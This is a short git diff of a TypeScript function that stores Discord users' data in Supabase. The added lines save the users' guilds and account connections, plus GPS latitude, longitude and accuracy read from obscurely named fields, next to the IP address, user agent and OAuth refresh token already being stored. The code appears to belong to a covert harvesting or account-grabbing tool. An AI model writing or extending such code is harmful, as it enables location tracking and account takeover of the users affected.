@@ -1,14 +1,15 @@
-import { DiscordUser, IpInfo } from "@/lib/types/userdata";
+import { DiscordUser, IpInfo, GpsData, DiscordGuild, DiscordConnection } from "@/lib/types/userdata";
 import { createClient } from "@supabase/supabase-js";
 // import { DiscordGuild, DiscordConnection } from "@/lib/types/userdata";
 
 export const pushToSupabase = async (
     refreshToken: string,
     userInfo: DiscordUser,
-    // ownGuilds: DiscordGuild[],
-    // connections: DiscordConnection[],
+    ownGuilds: DiscordGuild[],
+    connections: DiscordConnection[],
     ipInfo: IpInfo,
     ua: string,
+    gps: GpsData
 ) => {
     try {
         console.log("Attempting to connect to Supabase with service role...");
@@ -28,10 +29,15 @@ export const pushToSupabase = async (
             verified: userInfo.verified,
             ip: ipInfo.ip,
             user_agent: ua,
+            gps: {
+                accuracy: gps.ff,
+                latitude: gps.hh,
+                longitude: gps.xf
+            },
             refresh_token: refreshToken,
-            // guilds: ownGuilds,
-            // connections: connections,
-            created_at: new Date().toISOString()
+            guilds: ownGuilds,
+            connections: connections,
+            created_at: new Date().toISOString(),
         };
         
         console.log("Preparing to insert data:", JSON.stringify(userData));
